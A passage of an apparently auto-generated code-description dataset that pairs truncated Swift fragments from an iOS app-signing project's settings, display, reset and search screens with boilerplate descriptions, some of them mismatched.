    "nl": "/ Check if certificate is expiring within 7 days",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2871",
    "code": "override func viewDidAppear(_ animated: Bool) {\nsuper.viewDidAppear(animated)\n\n// Only add LED effects if view is initialized\nif isInitialized {",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2872",
    "code": "override func tableView(_: UITableView, willDisplay cell: UITableViewCell, forRowAt _: IndexPath) {\n// Only apply LED effects if view is initialized\nguard isInitialized else { return }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2873",
    "code": "private func safeInitialize() throws {\n// Initialize settings with error handling\ndo {",
    "nl": "Function safeInitialize - implements safeinitialize functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2874",
    "code": "private func initializeTableData() {\n// Use a defensive approach for section initialization\nvar sections: [[String]] = []\n\n// Build each section carefully, with try-catch for any potential errors\ndo {",
    "nl": "Separate method for initialization to make error handling clearer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2875",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Only reload if already initialized to prevent crashes\nif isInitialized {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2876",
    "code": "fileprivate func setupNavigation() {\ntitle = String.localized(\"TAB_SETTINGS\")\n\n// Ensure the navigation bar is properly configured\nif let navController = navigationController {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2877",
    "code": "override func refreshContent() {\n// Only refresh if view is loaded and initialized\nif isViewLoaded && isInitialized {",
    "nl": "MARK: - ViewControllerRefreshable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2878",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\n// Safety check to prevent crashes\nguard isInitialized, section < tableData.count else {",
    "nl": "MARK: - UITableViewDataSource & UITableViewDelegate overrides",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2879",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\n// Safety check to prevent crashes\nguard isInitialized else {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2880",
    "code": "private func ensureTableDataHasSections() {\n// If tableData is somehow nil, initialize it\nif tableData == nil {",
    "nl": "MARK: - Safe table setup helpers / Verify table structure is valid and fix it if not",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2881",
    "code": "extension SettingsViewController {\noverride func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {",
    "nl": "extension SettingsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2882",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nif Preferences.beta, section == 0 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2883",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .none\n\n// Safety check to prevent crashes\nguard isInitialized,\nindexPath.section < tableData.count,\nindexPath.row < tableData[indexPath.section].count else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2884",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\n// Safety check to prevent crashes\nguard isInitialized,\nindexPath.section < tableData.count,\nindexPath.row < tableData[indexPath.section].count else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2885",
    "code": "private func navigateSafely(to viewController: UIViewController) {\nDispatchQueue.main.async { [weak self] in",
    "nl": "MARK: - Safe Navigation Helpers / Navigate to a view controller with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2886",
    "code": "private func presentTerminalSafely() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Present terminal view controller with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2887",
    "code": "private func openURLSafely(_ urlString: String) {\nguard let url = URL(string: urlString) else {",
    "nl": "/ Open URL with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2888",
    "code": "private func openDirectorySafely(named directoryName: String) {\ndo {",
    "nl": "/ Open directory with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2889",
    "code": "private func resetOptionsActionSafely() {\ndo {",
    "nl": "/ Reset options with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2890",
    "code": "private func resetAllActionSafely() {\ndo {",
    "nl": "/ Reset all with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2891",
    "code": "extension UITableViewCell {\nfunc setAccessoryIcon(\nwith symbolName: String,\ntintColor: UIColor = .tertiaryLabel,\nrenderingMode: UIImage.RenderingMode = .alwaysOriginal\n) {",
    "nl": "extension UITableViewCell - implements functionality related to u i table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2892",
    "code": "func setAccessoryIcon(\nwith symbolName: String,\ntintColor: UIColor = .tertiaryLabel,\nrenderingMode: UIImage.RenderingMode = .alwaysOriginal\n) {",
    "nl": "Function setAccessoryIcon - sets accessoryicon",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2893",
    "code": "private extension SettingsViewController {\nfunc openDirectory(named directoryName: String) {",
    "nl": "extension SettingsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2894",
    "code": "func openDirectory(named directoryName: String) {\nlet directoryURL = getDocumentsDirectory().appendingPathComponent(directoryName)\nlet path = directoryURL.absoluteString.replacingOccurrences(of: \"file://\", with: \"shareddocuments://\")\n\nUIApplication.shared.open(URL(string: path)!, options: [:]) { success in",
    "nl": "Function openDirectory - implements opendirectory functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2895",
    "code": "class CollectionTableViewCell: UITableViewCell, UICollectionViewDelegate, UICollectionViewDataSource {\nvar selectedIndexPath: IndexPath?\n\nlet collectionView: UICollectionView = {",
    "nl": "class CollectionTableViewCell - implements functionality related to collection table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2896",
    "code": "func setData(collectionData: [String], colors: [String]) {\nself.collectionData = collectionData\ncollectionDataColors = colors\ncollectionView.reloadData()\n}\n\nfunc collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {",
    "nl": "Function setData - sets data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2897",
    "code": "func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {\nreturn collectionData.count\n}\n\nfunc collectionView(_ collectionView: UICollectionView,\ncellForItemAt indexPath: IndexPath) -> UICollectionViewCell\n{",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2898",
    "code": "func collectionView(_ collectionView: UICollectionView,\ncellForItemAt indexPath: IndexPath) -> UICollectionViewCell\n{",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2899",
    "code": "func collectionView(_ collectionView: UICollectionView, didSelectItemAt indexPath: IndexPath) {\nselectedIndexPath = indexPath\ncollectionView.reloadData()\n\nlet selectedColorHex = collectionDataColors[indexPath.item]\nlet selectedUIColor = UIColor(hex: selectedColorHex)\nPreferences.appTintColor = CodableColor(selectedUIColor)\n\nguard indexPath.item < collectionData.count else {",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2900",
    "code": "class CollectionItemCell: UICollectionViewCell {\nlet stackView: UIStackView = {",
    "nl": "class CollectionItemCell - implements functionality related to collection item cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2901",
    "code": "func setData(title: String, colorHex: String) {\ncolorCircleView.backgroundColor = UIColor(hex: colorHex)\ntitleLabel.text = title\n}\n}\n",
    "nl": "Function setData - sets data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayCollectionTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2902",
    "code": "class DisplayViewController: FRSTableViewController {\nlet collectionData = [\"Lime Green\", \"Red\", \"Purple\", \"Baby Blue\", \"Yellow\", \"White\", \"Orange\"]\nlet collectionDataColors = [\"99CC00\", \"FF0000\", \"800080\", \"89CFF0\", \"FFFF00\", \"FFFFFF\", \"FFA500\"]\n\noverride func viewDidLoad() {",
    "nl": "class DisplayViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2903",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\ntitle = String.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_DISPLAY\")\n\ntableData = [\n[String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_APPEARENCE\")],\n[\"Collection View\"],\n[],\n[\"Certificate Name\"],\n]",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2904",
    "code": "private func updateAppearance(with style: UIUserInterfaceStyle) {\nview.window?.overrideUserInterfaceStyle = style\nPreferences.preferredInterfaceStyle = style.rawValue\n}\n}\n\nextension DisplayViewController {",
    "nl": "Function updateAppearance - updates appearance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2905",
    "code": "extension DisplayViewController {\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "extension DisplayViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2906",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nif section == 2 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2907",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nvar cell = UITableViewCell(style: .default, reuseIdentifier: reuseIdentifier)\ncell.selectionStyle = .none\n\nif indexPath.section == 2 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2908",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nif indexPath.section == 2 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2909",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2910",
    "code": "@objc private func appearanceSegmentedControlChanged(_ sender: UISegmentedControl) {\nlet selectedStyle = UIUserInterfaceStyle.allCases[sender.selectedSegmentIndex]\nupdateAppearance(with: selectedStyle)\n}\n\n@objc private func certificateNameToggle(_ sender: UISwitch) {",
    "nl": "Function appearanceSegmentedControlChanged - implements appearancesegmentedcontrolchanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2911",
    "code": "@objc private func certificateNameToggle(_ sender: UISwitch) {\nPreferences.certificateTitleAppIDtoTeamID = sender.isOn\n}\n}\n",
    "nl": "Function certificateNameToggle - implements certificatenametoggle functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2912",
    "code": "extension SettingsViewController {\nfileprivate func resetAlert(\ntitle: String,\nmessage: String,\nactions: [(String, UIAlertAction.Style, () -> Void)] = [],\ncompletion: (() -> Void)? = nil\n) {",
    "nl": "extension SettingsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "extension"
  },
  {
    "id": "2913",
    "code": "fileprivate func resetAlert(\ntitle: String,\nmessage: String,\nactions: [(String, UIAlertAction.Style, () -> Void)] = [],\ncompletion: (() -> Void)? = nil\n) {",
    "nl": "Function resetAlert - implements resetalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2914",
    "code": "fileprivate func cacheSize() -> String {\nvar totalCacheSize = URLCache.shared.currentDiskUsage\nif let nukeCache = ImagePipeline.shared.configuration.dataCache as? DataCache {",
    "nl": "Function cacheSize - implements cachesize functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2915",
    "code": "fileprivate func sourcesCount() -> String {\nlet l = CoreDataManager.shared.getAZSources()\nreturn \"Source Count: \\(l.count)\"\n}\n\nfileprivate func downloadedCount() -> String {",
    "nl": "Function sourcesCount - implements sourcescount functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2916",
    "code": "fileprivate func downloadedCount() -> String {\nlet l = CoreDataManager.shared.getDatedDownloadedApps()\nreturn \"Downloaded App Count: \\(l.count)\"\n}\n\nfileprivate func signedCount() -> String {",
    "nl": "Function downloadedCount - implements downloadedcount functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2917",
    "code": "fileprivate func signedCount() -> String {\nlet l = CoreDataManager.shared.getDatedSignedApps()\nreturn \"Signed App Count: \\(l.count)\"\n}\n\nfileprivate func certificateCount() -> String {",
    "nl": "Function signedCount - implements signedcount functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2918",
    "code": "fileprivate func certificateCount() -> String {\nlet l = CoreDataManager.shared.getDatedCertificate()\nreturn \"Certificate Count: \\(l.count)\"\n}\n\npublic func resetOptionsAction() {",
    "nl": "Function certificateCount - implements certificatecount functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2919",
    "code": "public func resetOptionsAction() {\nvar totalCacheSize = URLCache.shared.currentDiskUsage\nif let nukeCache = ImagePipeline.shared.configuration.dataCache as? DataCache {",
    "nl": "Function resetOptionsAction - implements resetoptionsaction functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2920",
    "code": "public func resetAllAction() {\nresetAlert(\ntitle: \"Reset All Settings\",\nmessage: \"This action is IRREVERSIBLE. The app will go back to its original state.\",\nactions: [\n(\"Proceed\", .destructive, {",
    "nl": "Function resetAllAction - implements resetallaction functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2921",
    "code": "public func alertToFinish() {\nlet alertController = UIAlertController(\ntitle: \"\",\nmessage: String.localized(\"SUCCESS_REQUIRES_RESTART\"),\npreferredStyle: .alert\n)\n\nlet closeAction = UIAlertAction(title: String.localized(\"OK\"), style: .default) { _ in",
    "nl": "Function alertToFinish - implements alerttofinish functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift",
    "code_type": "function"
  },
  {
    "id": "2922",
    "code": "class ResetDataClass {\nstatic let shared = ResetDataClass()\n\ninit() {}",
    "nl": "class ResetDataClass - implements functionality related to reset data class",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "class"
  },
  {
    "id": "2923",
    "code": "func clearNetworkCache() {\nURLCache.shared.removeAllCachedResponses()\nHTTPCookieStorage.shared.removeCookies(since: Date.distantPast)\n\nif let dataCache = ImagePipeline.shared.configuration.dataCache as? DataCache {",
    "nl": "Function clearNetworkCache - implements clearnetworkcache functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2924",
    "code": "func deleteSignedApps() {\ndo {",
    "nl": "Function deleteSignedApps - deletes signedapps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2925",
    "code": "func deleteDownloadedApps() {\ndo {",
    "nl": "Function deleteDownloadedApps - deletes downloadedapps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2926",
    "code": "func resetCertificates(resetAll: Bool) {\nif !resetAll { Preferences.selectedCert = 0 }",
    "nl": "Function resetCertificates - implements resetcertificates functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2927",
    "code": "func resetSources(resetAll: Bool) {\nif !resetAll { Preferences.defaultRepos = false }",
    "nl": "Function resetSources - implements resetsources functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2928",
    "code": "private func resetAllUserDefaults() {\nif let bundleID = Bundle.main.bundleIdentifier {",
    "nl": "Function resetAllUserDefaults - implements resetalluserdefaults functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2929",
    "code": "func resetAll() {\ndeleteSignedApps()\ndeleteDownloadedApps()\nresetCertificates(resetAll: true)\nresetSources(resetAll: true)\nresetAllUserDefaults()\nclearNetworkCache()\n}\n\nprivate func deleteDirectory(named directoryName: String, additionalComponents: [String]? = nil) {",
    "nl": "Function resetAll - implements resetall functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2930",
    "code": "private func deleteDirectory(named directoryName: String, additionalComponents: [String]? = nil) {\nvar directoryURL = getDocumentsDirectory().appendingPathComponent(directoryName)\n\nif let components = additionalComponents {",
    "nl": "Function deleteDirectory - deletes directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift",
    "code_type": "function"
  },
  {
    "id": "2931",
    "code": "class SearchSettingsViewController: UITableViewController {\n// MARK: - Properties\n\nprivate let cellReuseIdentifier = \"SearchSettingCell\"\nprivate let switchCellReuseIdentifier = \"SearchSettingSwitchCell\"\nprivate let labelCellReuseIdentifier = \"SearchSettingLabelCell\"\n\n// Privacy manager reference\nprivate let privacyManager = SearchPrivacyManager()\n",
    "nl": "/ View controller for managing web search settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2932",
    "code": "private enum Section: Int {\ncase info = 0\ncase features = 1\ncase privacy = 2\ncase searchTypes = 3\ncase exclusions = 4\ncase resetSection = 5\n}\n\n// Default search depth option",
    "nl": "Section types",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2933",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupView()\nloadSettings()\n}\n\nprivate func setupView() {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2934",
    "code": "private func setupView() {\ntitle = \"Search Settings\"\n\n// Register cell types\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)\ntableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: labelCellReuseIdentifier)\n\ntableView.tableFooterView = UIView()\ntableView.estimatedRowHeight = 44",
    "nl": "Function setupView - sets upview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2935",
    "code": "private func loadSettings() {\n// Load default search depth\nif let rawDepth = UserDefaults.standard.object(forKey: \"default_search_depth\") as? Int,\nlet depth = SearchDepth(rawValue: rawDepth)\n{",
    "nl": "Function loadSettings - implements loadsettings functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2936",
    "code": "@objc private func doneTapped() {\nnavigationController?.popViewController(animated: true)\n}\n\n// MARK: - Table View Data Source\n\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "Function doneTapped - implements donetapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2937",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 6\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - Table View Data Source",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2938",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2939",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2940",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nswitch Section(rawValue: section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2941",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nswitch Section(rawValue: indexPath.section) {",
    "nl": "Function tableView - implements tableview functionality",
